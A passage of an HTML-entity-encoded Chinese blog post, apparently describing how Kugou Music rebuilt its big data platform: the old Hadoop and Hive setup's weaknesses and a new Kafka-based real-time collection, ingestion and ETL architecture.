59CB;&#x53EA;&#x77E5;&#x9053;&#x5927;&#x6570;&#x636E;&#x8FD9;&#x4E2A;&#x6982;&#x5FF5;&#xFF0C;&#x5230;&#x73B0;&#x5728;&#x6210;&#x4E3A;&#x56E2;&#x961F;&#x7684;&#x6280;&#x672F;&#x652F;&#x67F1;&#xFF0C;&#x611F;&#x5230;&#x5F88;&#x6B23;&#x6170;&#x3002;</p>\n<p>&#x4ECE;&#x91CD;&#x6784;&#x539F;&#x56E0;&#xFF0C;&#x6280;&#x672F;&#x67B6;&#x6784;&#xFF0C;&#x8E29;&#x8FC7;&#x7684;&#x5751;&#xFF0C;&#x540E;&#x7EED;&#x6301;&#x7EED;&#x6539;&#x8FDB;&#x56DB;&#x4E2A;&#x65B9;&#x9762;&#x6765;&#x63CF;&#x8FF0;&#x9177;&#x72D7;&#x97F3;&#x4E50;&#x5927;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x91CD;&#x6784;&#x7684;&#x8FC7;&#x7A0B;&#xFF0C;&#x5728;&#x6B64;&#x629B;&#x7816;&#x5F15;&#x7389;&#xFF0C;&#x8FD9;&#x6B21;&#x7684;&#x5185;&#x5BB9;&#x4E0E;6&#x6708;&#x4EFD;&#x5728;&#x9AD8;&#x53EF;&#x7528;&#x67B6;&#x6784;&#x7FA4;&#x5206;&#x4EAB;&#x7684;&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x5B9E;&#x8DF5;&#x7684;&#x6709;&#x70B9;&#x4E0D;&#x540C;&#xFF0C;&#x6280;&#x672F;&#x67B6;&#x6784;&#x505A;&#x4E86;&#x4E9B;&#x8C03;&#x6574;&#x3002;</p>\n<p>&#x5176;&#x5B9E;&#x5927;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x662F;&#x4E00;&#x4E2A;&#x5E9E;&#x5927;&#x7684;&#x7CFB;&#x7EDF;&#x5DE5;&#x7A0B;&#xFF0C;&#x6574;&#x4E2A;&#x5EFA;&#x8BBE;&#x5468;&#x671F;&#x5F88;&#x957F;&#xFF0C;&#x6D89;&#x53CA;&#x7684;&#x751F;&#x6001;&#x94FE;&#x5F88;&#x957F;(&#x5305;&#x62EC;&#xFF1A;&#x6570;&#x636E;&#x91C7;&#x96C6;&#x3001;&#x63A5;&#x5165;&#xFF0C;&#x6E05;&#x6D17;&#x3001;&#x5B58;&#x50A8;&#x8BA1;&#x7B97;&#x3001;&#x6570;&#x636E;&#x6316;&#x6398;&#xFF0C;&#x53EF;&#x89C6;&#x5316;&#x7B49;&#x73AF;&#x8282;&#xFF0C;&#x6BCF;&#x4E2A;&#x73AF;&#x8282;&#x90FD;&#x5F53;&#x505A;&#x4E00;&#x4E2A;&#x590D;&#x6742;&#x7684;&#x7CFB;&#x7EDF;&#x6765;&#x5EFA;&#x8BBE;)&#xFF0C;&#x98CE;&#x9669;&#x4E5F;&#x5F88;&#x5927;&#x3002;<br><a id=\"more\"></a></p>\n<h2 id=\"&#x4E00;&#x3001;&#x91CD;&#x6784;&#x539F;&#x56E0;\"><a href=\"#&#x4E00;&#x3001;&#x91CD;&#x6784;&#x539F;&#x56E0;\" class=\"headerlink\" title=\"&#x4E00;&#x3001;&#x91CD;&#x6784;&#x539F;&#x56E0;\"></a>&#x4E00;&#x3001;&#x91CD;&#x6784;&#x539F;&#x56E0;</h2><p>&#x5728;&#x8BB2;&#x91CD;&#x6784;&#x539F;&#x56E0;&#x524D;&#xFF0C;&#x5148;&#x4ECB;&#x7ECD;&#x4E0B;&#x539F;&#x6709;&#x7684;&#x5927;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x67B6;&#x6784;&#xFF0C;&#x5982;&#x4E0B;&#x56FE;&#xFF1A;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/1.jpg\" alt=\"&#x5927;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x67B6;&#x6784;\"></p>\n<p>&#x4ECE;&#x4E0A;&#x56FE;&#x53EF;&#x77E5;&#xFF0C;&#x4E3B;&#x8981;&#x57FA;&#x4E8E;Hadoop1.x+hive&#x505A;&#x79BB;&#x7EBF;&#x8BA1;&#x7B97;(T+1)&#xFF0C;&#x57FA;&#x4E8E;&#x5927;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x7684;&#x6570;&#x636E;&#x91C7;&#x96C6;&#x3001;&#x6570;&#x636E;&#x63A5;&#x5165;&#x3001;&#x6570;&#x636E;&#x6E05;&#x6D17;&#x3001;&#x4F5C;&#x4E1A;&#x8C03;&#x5EA6;&#x3001;&#x5E73;&#x53F0;&#x76D1;&#x63A7;&#x51E0;&#x4E2A;&#x73AF;&#x8282;&#x5B58;&#x5728;&#x7684;&#x4E00;&#x4E9B;&#x95EE;&#x9898;&#x6765;&#x5217;&#x4E3E;&#x4E0B;&#x3002;</p>\n<h3 id=\"&#x6570;&#x636E;&#x91C7;&#x96C6;&#xFF1A;\"><a href=\"#&#x6570;&#x636E;&#x91C7;&#x96C6;&#xFF1A;\" class=\"headerlink\" title=\"&#x6570;&#x636E;&#x91C7;&#x96C6;&#xFF1A;\"></a>&#x6570;&#x636E;&#x91C7;&#x96C6;&#xFF1A;</h3><p>1&#x3001;&#x6570;&#x636E;&#x6536;&#x96C6;&#x63A5;&#x53E3;&#x4F17;&#x591A;&#xFF0C;&#x4E14;&#x6570;&#x636E;&#x683C;&#x5F0F;&#x6DF7;&#x4E71;&#xFF0C;&#x57FA;&#x672C;&#x6BCF;&#x4E2A;&#x4E1A;&#x52A1;&#x90FD;&#x6709;&#x81EA;&#x5DF1;&#x7684;&#x4E0A;&#x62A5;&#x63A5;&#x53E3;<br>2&#x3001;&#x5B58;&#x5728;&#x8F83;&#x5927;&#x7684;&#x91CD;&#x590D;&#x5F00;&#x53D1;&#x6210;&#x672C;<br>3&#x3001;&#x4E0D;&#x80FD;&#x6C47;&#x603B;&#x4E0A;&#x62A5;&#xFF0C;&#x6D88;&#x8017;&#x5BA2;&#x6237;&#x7AEF;&#x8D44;&#x6E90;&#xFF0C;&#x4EE5;&#x53CA;&#x7F51;&#x7EDC;&#x6D41;&#x91CF;<br>4&#x3001;&#x6BCF;&#x4E2A;&#x63A5;&#x53E3;&#x6536;&#x96C6;&#x6570;&#x636E;&#x9879;&#x548C;&#x683C;&#x5F0F;&#x4E0D;&#x7EDF;&#x4E00;&#xFF0C;&#x52A0;&#x5927;&#x540E;&#x671F;&#x6570;&#x636E;&#x7EDF;&#x8BA1;&#x5206;&#x6790;&#x96BE;&#x5EA6;<br>5&#x3001;&#x5404;&#x4E2A;&#x63A5;&#x53E3;&#x5B9E;&#x73B0;&#x8D28;&#x91CF;&#x5E76;&#x4E0D;&#x9AD8;&#xFF0C;&#x5B58;&#x5728;&#x88AB;&#x5237;&#xFF0C;&#x6CC4;&#x5BC6;&#x7B49;&#x98CE;&#x9669;</p>\n<h3 id=\"&#x6570;&#x636E;&#x63A5;&#x5165;\"><a href=\"#&#x6570;&#x636E;&#x63A5;&#x5165;\" class=\"headerlink\" title=\"&#x6570;&#x636E;&#x63A5;&#x5165;:\"></a>&#x6570;&#x636E;&#x63A5;&#x5165;:</h3><p>1&#x3001;&#x901A;&#x8FC7;rsync&#x540C;&#x6B65;&#x6587;&#x4EF6;&#xFF0C;&#x5F88;&#x96BE;&#x6EE1;&#x8DB3;&#x5B9E;&#x65F6;&#x6D41;&#x8BA1;&#x7B97;&#x7684;&#x9700;&#x6C42;<br>2&#x3001;&#x63A5;&#x5165;&#x6570;&#x636E;&#x51FA;&#x73B0;&#x5F02;&#x5E38;&#x540E;&#xFF0C;&#x5F88;&#x96BE;&#x6392;&#x67E5;&#x53CA;&#x5B9A;&#x4F4D;&#x95EE;&#x9898;&#xFF0C;&#x9700;&#x8981;&#x5F88;&#x9AD8;&#x7684;&#x4EBA;&#x529B;&#x6210;&#x672C;&#x6392;&#x67E5;<br>3&#x3001;&#x4E1A;&#x52A1;&#x7CFB;&#x7EDF;&#x6570;&#x636E;&#x901A;&#x8FC7;Kettle&#x6BCF;&#x5929;&#x5168;&#x91CF;&#x540C;&#x6B65;&#x5230;&#x6570;&#x636E;&#x4E2D;&#x5FC3;&#xFF0C;&#x540C;&#x6B65;&#x65F6;&#x95F4;&#x957F;&#xFF0C;&#x5BFC;&#x81F4;&#x4F9D;&#x8D56;&#x7684;&#x4F5C;&#x4E1A;&#x7ECF;&#x5E38;&#x4F1A;&#x6709;&#x5EF6;&#x65F6;&#x73B0;&#x8C61;</p>\n<h3 id=\"&#x6570;&#x636E;&#x6E05;&#x6D17;&#xFF1A;\"><a href=\"#&#x6570;&#x636E;&#x6E05;&#x6D17;&#xFF1A;\" class=\"headerlink\" title=\"&#x6570;&#x636E;&#x6E05;&#x6D17;&#xFF1A;\"></a>&#x6570;&#x636E;&#x6E05;&#x6D17;&#xFF1A;</h3><p>1&#x3001;ETL&#x96C6;&#x4E2D;&#x5728;&#x4F5C;&#x4E1A;&#x8BA1;&#x7B97;&#x524D;&#x8FDB;&#x884C;&#x5904;&#x7406;<br>2&#x3001;&#x5B58;&#x5728;&#x91CD;&#x590D;&#x6E05;&#x6D17;</p>\n<h3 id=\"&#x4F5C;&#x4E1A;&#x8C03;&#x5EA6;&#xFF1A;\"><a href=\"#&#x4F5C;&#x4E1A;&#x8C03;&#x5EA6;&#xFF1A;\" class=\"headerlink\" title=\"&#x4F5C;&#x4E1A;&#x8C03;&#x5EA6;&#xFF1A;\"></a>&#x4F5C;&#x4E1A;&#x8C03;&#x5EA6;&#xFF1A;</h3><p>1&#x3001;&#x5927;&#x90E8;&#x5206;&#x4F5C;&#x4E1A;&#x901A;&#x8FC7;crontab&#x8C03;&#x5EA6;&#xFF0C;&#x4F5C;&#x4E1A;&#x591A;&#x4E86;&#x540E;&#x4E0D;&#x5229;&#x4E8E;&#x7BA1;&#x7406;<br>2&#x3001;&#x7ECF;&#x5E38;&#x51FA;&#x73B0;&#x4F5C;&#x4E1A;&#x8C03;&#x5EA6;&#x51B2;&#x7A81;</p>\n<h3 id=\"&#x5E73;&#x53F0;&#x76D1;&#x63A7;&#xFF1A;\"><a href=\"#&#x5E73;&#x53F0;&#x76D1;&#x63A7;&#xFF1A;\" class=\"headerlink\" title=\"&#x5E73;&#x53F0;&#x76D1;&#x63A7;&#xFF1A;\"></a>&#x5E73;&#x53F0;&#x76D1;&#x63A7;&#xFF1A;</h3><p>1&#x3001;&#x53EA;&#x6709;&#x786C;&#x4EF6;&#x4E0E;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7EA7;&#x76D1;&#x63A7;<br>2&#x3001;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x65B9;&#x9762;&#x7684;&#x76D1;&#x63A7;&#x7B49;&#x4E8E;&#x7A7A;&#x767D;</p>\n<p>&#x57FA;&#x4E8E;&#x4EE5;&#x4E0A;&#x95EE;&#x9898;&#xFF0C;&#x7ED3;&#x5408;&#x5728;&#x5927;&#x6570;&#x636E;&#x4E2D;&#xFF0C;&#x6570;&#x636E;&#x7684;&#x65F6;&#x6548;&#x6027;&#x8D8A;&#x9AD8;&#xFF0C;&#x6570;&#x636E;&#x8D8A;&#x6709;&#x4EF7;&#x503C;(&#x5982;&#xFF1A;&#x5B9E;&#x65F6;&#x4E2A;&#x6027;&#x5316;&#x63A8;&#x8350;&#x7CFB;&#x7EDF;&#xFF0C;RTB&#x7CFB;&#x7EDF;&#xFF0C;&#x5B9E;&#x65F6;&#x9884;&#x8B66;&#x7CFB;&#x7EDF;&#x7B49;)&#x7684;&#x7406;&#x5FF5;&#xFF0C;&#x56E0;&#x6B64;&#xFF0C;&#x5F00;&#x59CB;&#x5927;&#x91CD;&#x6784;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x67B6;&#x6784;&#x3002;</p>\n<h2 id=\"&#x4E8C;&#x3001;&#x65B0;&#x4E00;&#x4EE3;&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x67B6;&#x6784;\"><a href=\"#&#x4E8C;&#x3001;&#x65B0;&#x4E00;&#x4EE3;&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x67B6;&#x6784;\" class=\"headerlink\" title=\"&#x4E8C;&#x3001;&#x65B0;&#x4E00;&#x4EE3;&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x67B6;&#x6784;\"></a>&#x4E8C;&#x3001;&#x65B0;&#x4E00;&#x4EE3;&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x67B6;&#x6784;</h2><p>&#x5728;&#x8BB2;&#x65B0;&#x4E00;&#x4EE3;&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x67B6;&#x6784;&#x524D;&#xFF0C;&#x5148;&#x8BB2;&#x4E0B;&#x5927;&#x6570;&#x636E;&#x7279;&#x5F81;&#x4E0E;&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x8981;&#x89E3;&#x51B3;&#x7684;&#x95EE;&#x9898;&#x3002;</p>\n<p><strong>1.&#x5927;&#x6570;&#x636E;&#x7279;&#x5F81;</strong>&#xFF1A;&#x201C;&#x5927;&#x91CF;&#x5316;(Volume)&#x3001;&#x591A;&#x6837;&#x5316;(Variety)&#x3001;&#x5FEB;&#x901F;&#x5316;(Velocity)&#x3001;&#x4EF7;&#x503C;&#x5BC6;&#x5EA6;&#x4F4E;(Value)&#x201D;&#x5C31;&#x662F;&#x201C;&#x5927;&#x6570;&#x636E;&#x201D;&#x663E;&#x8457;&#x7684;4V&#x7279;&#x5F81;&#xFF0C;&#x6216;&#x8005;&#x8BF4;&#xFF0C;&#x53EA;&#x6709;&#x5177;&#x5907;&#x8FD9;&#x4E9B;&#x7279;&#x70B9;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x624D;&#x662F;&#x5927;&#x6570;&#x636E;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/2.jpg\" alt=\"&#x5927;&#x6570;&#x636E;&#x7279;&#x5F81;\"></p>\n<p><strong>2.&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x8981;&#x89E3;&#x51B3;&#x7684;&#x95EE;&#x9898;</strong>&#xFF1A;&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x88AB;&#x8BBE;&#x8BA1;&#x7528;&#x4E8E;&#x5728;&#x6210;&#x672C;&#x53EF;&#x627F;&#x53D7;&#x7684;&#x6761;&#x4EF6;&#x4E0B;&#xFF0C;&#x901A;&#x8FC7;&#x975E;&#x5E38;&#x5FEB;&#x901F;(velocity)&#x5730;&#x91C7;&#x96C6;&#x3001;&#x53D1;&#x73B0;&#x548C;&#x5206;&#x6790;&#xFF0C;&#x4ECE;&#x5927;&#x91CF;(volumes)&#x3001;&#x591A;&#x7C7B;&#x522B;(variety)&#x7684;&#x6570;&#x636E;&#x4E2D;&#x63D0;&#x53D6;&#x4EF7;&#x503C;(value)&#xFF0C;&#x5C06;&#x662F;IT&#x9886;&#x57DF;&#x65B0;&#x4E00;&#x4EE3;&#x7684;&#x6280;&#x672F;&#x4E0E;&#x67B6;&#x6784;&#x3002;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/3.jpg\" alt=\"&#x9700;&#x8981;&#x89E3;&#x51B3;&#x7684;&#x95EE;&#x9898;\"></p>\n<p>&#x4ECB;&#x7ECD;&#x4E86;&#x5927;&#x6570;&#x636E;&#x7684;&#x7279;&#x6027;&#x53CA;&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x8981;&#x89E3;&#x51B3;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x6211;&#x4EEC;&#x5148;&#x770B;&#x770B;&#x65B0;&#x4E00;&#x4EE3;&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x67B6;&#x6784;&#x7684;&#x6570;&#x636E;&#x6D41;&#x67B6;&#x6784;&#x56FE;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/4.jpg\" alt=\"&#x6570;&#x636E;&#x6D41;&#x67B6;&#x6784;\"></p>\n<p>&#x4ECE;&#x8FD9;&#x5F20;&#x56FE;&#x4E2D;&#xFF0C;&#x53EF;&#x4EE5;&#x4E86;&#x89E3;&#x5230;&#x5927;&#x6570;&#x636E;&#x5904;&#x7406;&#x8FC7;&#x7A0B;&#x53EF;&#x4EE5;&#x5206;&#x4E3A;&#x6570;&#x636E;&#x6E90;&#x3001;&#x6570;&#x636E;&#x63A5;&#x5165;&#x3001;&#x6570;&#x636E;&#x6E05;&#x6D17;&#x3001;&#x6570;&#x636E;&#x7F13;&#x5B58;&#x3001;&#x5B58;&#x50A8;&#x8BA1;&#x7B97;&#x3001;&#x6570;&#x636E;&#x670D;&#x52A1;&#x3001;&#x6570;&#x636E;&#x6D88;&#x8D39;&#x7B49;&#x73AF;&#x8282;&#xFF0C;&#x6BCF;&#x4E2A;&#x73AF;&#x8282;&#x90FD;&#x6709;&#x5177;&#x6709;&#x9AD8;&#x53EF;&#x7528;&#x6027;&#x3001;&#x53EF;&#x6269;&#x5C55;&#x6027;&#x7B49;&#x7279;&#x6027;&#xFF0C;&#x90FD;&#x4E3A;&#x4E0B;&#x4E00;&#x4E2A;&#x8282;&#x70B9;&#x66F4;&#x597D;&#x7684;&#x670D;&#x52A1;&#x6253;&#x4E0B;&#x57FA;&#x7840;&#x3002;&#x6574;&#x4E2A;&#x6570;&#x636E;&#x6D41;&#x8FC7;&#x7A0B;&#x90FD;&#x88AB;&#x6570;&#x636E;&#x8D28;&#x91CF;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#x76D1;&#x63A7;&#xFF0C;&#x6570;&#x636E;&#x5F02;&#x5E38;&#x81EA;&#x52A8;&#x9884;&#x8B66;&#x3001;&#x544A;&#x8B66;&#x3002;<br>&#x65B0;&#x4E00;&#x4EE3;&#x5927;&#x6570;&#x636E;&#x6574;&#x4F53;&#x6280;&#x672F;&#x67B6;&#x6784;&#x5982;&#x56FE;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/5.jpg\" alt=\"&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x67B6;&#x6784;\"></p>\n<p>&#x5C06;&#x5927;&#x6570;&#x636E;&#x8BA1;&#x7B97;&#x5206;&#x4E3A;&#x5B9E;&#x65F6;&#x8BA1;&#x7B97;&#x4E0E;&#x79BB;&#x7EBF;&#x8BA1;&#x7B97;&#xFF0C;&#x5728;&#x6574;&#x4E2A;&#x96C6;&#x7FA4;&#x4E2D;&#xFF0C;&#x5954;&#x7740;&#x80FD;&#x5B9E;&#x65F6;&#x8BA1;&#x7B97;&#x7684;&#xFF0C;&#x4E00;&#x5B9A;&#x8D70;&#x5B9E;&#x65F6;&#x8BA1;&#x7B97;&#x6D41;&#x5904;&#x7406;&#xFF0C;&#x901A;&#x8FC7;&#x5B9E;&#x65F6;&#x8BA1;&#x7B97;&#x6D41;&#x6765;&#x63D0;&#x9AD8;&#x6570;&#x636E;&#x7684;&#x65F6;&#x6548;&#x6027;&#x53CA;&#x6570;&#x636E;&#x4EF7;&#x503C;&#xFF0C;&#x540C;&#x65F6;&#x51CF;&#x8F7B;&#x96C6;&#x7FA4;&#x7684;&#x8D44;&#x6E90;&#x4F7F;&#x7528;&#x7387;&#x96C6;&#x4E2D;&#x73B0;&#x8C61;&#x3002;</p>\n<h3 id=\"&#x6574;&#x4F53;&#x67B6;&#x6784;&#x4ECE;&#x4E0B;&#x5F80;&#x4E0A;&#x89E3;&#x91CA;&#x4E0B;&#x6BCF;&#x5C42;&#x7684;&#x4F5C;&#x7528;&#xFF1A;\"><a href=\"#&#x6574;&#x4F53;&#x67B6;&#x6784;&#x4ECE;&#x4E0B;&#x5F80;&#x4E0A;&#x89E3;&#x91CA;&#x4E0B;&#x6BCF;&#x5C42;&#x7684;&#x4F5C;&#x7528;&#xFF1A;\" class=\"headerlink\" title=\"&#x6574;&#x4F53;&#x67B6;&#x6784;&#x4ECE;&#x4E0B;&#x5F80;&#x4E0A;&#x89E3;&#x91CA;&#x4E0B;&#x6BCF;&#x5C42;&#x7684;&#x4F5C;&#x7528;&#xFF1A;\"></a>&#x6574;&#x4F53;&#x67B6;&#x6784;&#x4ECE;&#x4E0B;&#x5F80;&#x4E0A;&#x89E3;&#x91CA;&#x4E0B;&#x6BCF;&#x5C42;&#x7684;&#x4F5C;&#x7528;&#xFF1A;</h3><h4 id=\"&#x6570;&#x636E;&#x5B9E;&#x65F6;&#x91C7;&#x96C6;&#xFF1A;\"><a href=\"#&#x6570;&#x636E;&#x5B9E;&#x65F6;&#x91C7;&#x96C6;&#xFF1A;\" class=\"headerlink\" title=\"&#x6570;&#x636E;&#x5B9E;&#x65F6;&#x91C7;&#x96C6;&#xFF1A;\"></a>&#x6570;&#x636E;&#x5B9E;&#x65F6;&#x91C7;&#x96C6;&#xFF1A;</h4><p>&#x4E3B;&#x8981;&#x7528;&#x4E8E;&#x6570;&#x636E;&#x6E90;&#x91C7;&#x96C6;&#x670D;&#x52A1;&#xFF0C;&#x4ECE;&#x6570;&#x636E;&#x6D41;&#x67B6;&#x6784;&#x56FE;&#x4E2D;&#xFF0C;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#xFF0C;&#x6570;&#x636E;&#x6E90;&#x5206;&#x4E3A;&#x524D;&#x7AEF;&#x65E5;&#x5FD7;&#xFF0C;&#x670D;&#x52A1;&#x7AEF;&#x65E5;&#x5FD7;&#xFF0C;&#x4E1A;&#x52A1;&#x7CFB;&#x7EDF;&#x6570;&#x636E;&#x3002;&#x4E0B;&#x9762;&#x8BB2;&#x89E3;&#x6570;&#x636E;&#x662F;&#x600E;&#x4E48;&#x91C7;&#x96C6;&#x63A5;&#x5165;&#x7684;&#x3002;</p>\n<p><strong>a.&#x524D;&#x7AEF;&#x65E5;&#x5FD7;&#x91C7;&#x96C6;&#x63A5;&#x5165;</strong>&#xFF1A;</p>\n<p>&#x524D;&#x7AEF;&#x65E5;&#x5FD7;&#x91C7;&#x96C6;&#x8981;&#x6C42;&#x5B9E;&#x65F6;&#xFF0C;&#x53EF;&#x9760;&#x6027;&#xFF0C;&#x9AD8;&#x53EF;&#x7528;&#x6027;&#x7B49;&#x7279;&#x6027;&#x3002;&#x6280;&#x672F;&#x9009;&#x578B;&#x65F6;&#xFF0C;&#x5BF9;&#x5F00;&#x6E90;&#x7684;&#x6570;&#x636E;&#x91C7;&#x96C6;&#x5DE5;&#x5177;flume,scribe,chukwa&#x6D4B;&#x8BD5;&#x5BF9;&#x6BD4;&#xFF0C;&#x53D1;&#x73B0;&#x57FA;&#x672C;&#x6EE1;&#x8DB3;&#x4E0D;&#x4E86;&#x6211;&#x4EEC;&#x7684;&#x4E1A;&#x52A1;&#x573A;&#x666F;&#x9700;&#x6C42;&#x3002;&#x6240;&#x4EE5;&#xFF0C;&#x9009;&#x62E9;&#x57FA;&#x4E8E;kafka&#x5F00;&#x53D1;&#x4E00;&#x5957;&#x6570;&#x636E;&#x91C7;&#x96C6;&#x7F51;&#x5173;&#xFF0C;&#x6765;&#x5B8C;&#x6210;&#x6570;&#x636E;&#x91C7;&#x96C6;&#x9700;&#x6C42;&#x3002;&#x6570;&#x636E;&#x91C7;&#x96C6;&#x7F51;&#x5173;&#x7684;&#x5F00;&#x53D1;&#x8FC7;&#x7A0B;&#x4E2D;&#x8D70;&#x4E86;&#x4E00;&#x4E9B;&#x5F2F;&#x8DEF;&#xFF0C;&#x6700;&#x540E;&#x91C7;&#x7528;nginx+lua&#x5F00;&#x53D1;&#xFF0C;&#x57FA;&#x4E8E;lua&#x5B9E;&#x73B0;&#x4E86;kafka&#x751F;&#x4EA7;&#x8005;&#x534F;&#x8BAE;&#x3002;&#x6709;&#x5174;&#x8DA3;&#x540C;&#x5B66;&#x53EF;&#x4EE5;&#x53BB;Github&#x4E0A;&#x770B;&#x770B;&#xFF0C;&#x53E6;&#x4E00;&#x540C;&#x4E8B;&#x5B9E;&#x73B0;&#x7684;&#xFF0C;&#x73B0;&#x5728;&#x5728;github&#x4E0A;&#x6BD4;&#x8F83;&#x6D3B;&#x8DC3;&#xFF0C;&#x88AB;&#x4E00;&#x4E9B;&#x4E92;&#x8054;&#x7F51;&#x516C;&#x53F8;&#x5E94;&#x7528;&#x4E8E;&#x7EBF;&#x4E0A;&#x73AF;&#x5883;&#x4E86;&#x3002;</p>\n<p><strong>b.&#x540E;&#x7AEF;&#x65E5;&#x5FD7;&#x91C7;&#x96C6;&#x63A5;&#x5165;</strong>&#xFF1A;</p>\n<p>FileCollect,&#x8003;&#x8651;&#x5230;&#x5F88;&#x591A;&#x7EBF;&#x4E0A;&#x73AF;&#x5883;&#x7684;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x4E0D;&#x80FD;&#x6539;&#x52A8;&#xFF0C;&#x4E3A;&#x51CF;&#x5C11;&#x4FB5;&#x5165;&#x5F0F;&#xFF0C;&#x76EE;&#x524D;&#x662F;&#x91C7;&#x7528;Go&#x8BED;&#x8A00;&#x5B9E;&#x73B0;&#x6587;&#x4EF6;&#x91C7;&#x96C6;&#xFF0C;&#x5E74;&#x540E;&#x4E5F;&#x51C6;&#x5907;&#x91CD;&#x6784;&#x8FD9;&#x5757;&#x3002;</p>\n<p>&#x524D;&#x7AEF;&#xFF0C;&#x670D;&#x52A1;&#x7AEF;&#x7684;&#x6570;&#x636E;&#x91C7;&#x96C6;&#x6574;&#x4F53;&#x67B6;&#x6784;&#x5982;&#x4E0B;&#x56FE;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/6.jpg\" alt=\"&#x6570;&#x636E;&#x91C7;&#x96C6;&#x67B6;&#x6784;\"></p>\n<p><strong>c.&#x4E1A;&#x52A1;&#x6570;&#x636E;&#x63A5;&#x5165;</strong></p>\n<p>&#x5229;&#x7528;Canal&#x901A;&#x8FC7;MySQL&#x7684;binlog&#x673A;&#x5236;&#x5B9E;&#x65F6;&#x540C;&#x6B65;&#x4E1A;&#x52A1;&#x589E;&#x91CF;&#x6570;&#x636E;&#x3002;</p>\n<p>&#x6570;&#x636E;&#x7EDF;&#x4E00;&#x63A5;&#x5165;&#xFF1A;&#x4E3A;&#x4E86;&#x540E;&#x9762;&#x6570;&#x636E;&#x6D41;&#x73AF;&#x8282;&#x7684;&#x5904;&#x7406;&#x89C4;&#x8303;&#xFF0C;&#x6240;&#x6709;&#x7684;&#x6570;&#x636E;&#x63A5;&#x5165;&#x6570;&#x636E;&#x4E2D;&#x5FC3;&#xFF0C;&#x5FC5;&#x987B;&#x901A;&#x8FC7;&#x6570;&#x636E;&#x91C7;&#x96C6;&#x7F51;&#x5173;&#x8F6C;&#x6362;&#x7EDF;&#x4E00;&#x4E0A;&#x62A5;&#x7ED9;Kafka&#x96C6;&#x7FA4;&#xFF0C;&#x907F;&#x514D;&#x540E;&#x7AEF;&#x591A;&#x79CD;&#x63A5;&#x5165;&#x65B9;&#x5F0F;&#x7684;&#x5904;&#x7406;&#x95EE;&#x9898;&#x3002;</p>\n<p>&#x6570;&#x636E;&#x5B9E;&#x65F6;&#x6E05;&#x6D17;(ETL)&#xFF1A;&#x4E3A;&#x4E86;&#x51CF;&#x8F7B;&#x5B58;&#x50A8;&#x8BA1;&#x7B97;&#x96C6;&#x7FA4;&#x7684;&#x8D44;&#x6E90;&#x538B;&#x529B;&#x53CA;&#x6570;&#x636E;&#x53EF;&#x91CD;&#x7528;&#x6027;&#x89D2;&#x5EA6;&#x8003;&#x8651;&#xFF0C;&#x628A;&#x6570;&#x636E;&#x89E3;&#x538B;&#x3001;&#x89E3;&#x5BC6;&#x3001;&#x8F6C;&#x4E49;&#xFF0C;&#x90E8;&#x5206;&#x7B80;&#x5355;&#x7684;&#x8865;&#x5168;&#xFF0C;&#x5F02;&#x5E38;&#x6570;&#x636E;&#x5904;&#x7406;&#x7B49;&#x5DE5;&#x4F5C;&#x524D;&#x79FB;&#x5230;&#x6570;&#x636E;&#x6D41;&#x4E2D;&#x5904;&#x7406;&#xFF0C;&#x4E3A;&#x540E;&#x9762;&#x73AF;&#x8282;&#x7684;&#x6570;&#x636E;&#x91CD;&#x7528;&#x6253;&#x4E0B;&#x624E;&#x5B9E;&#x7684;&#x57FA;&#x7840;(&#x5B9E;&#x65F6;&#x8BA1;&#x7B97;&#x4E0E;&#x79BB;&#x7EBF;&#x8BA1;&#x7B97;)&#x3002;</p>\n<p>&#x6570;&#x636E;&#x7F13;&#x5B58;&#x91CD;&#x7528;&#xFF1A;&#x4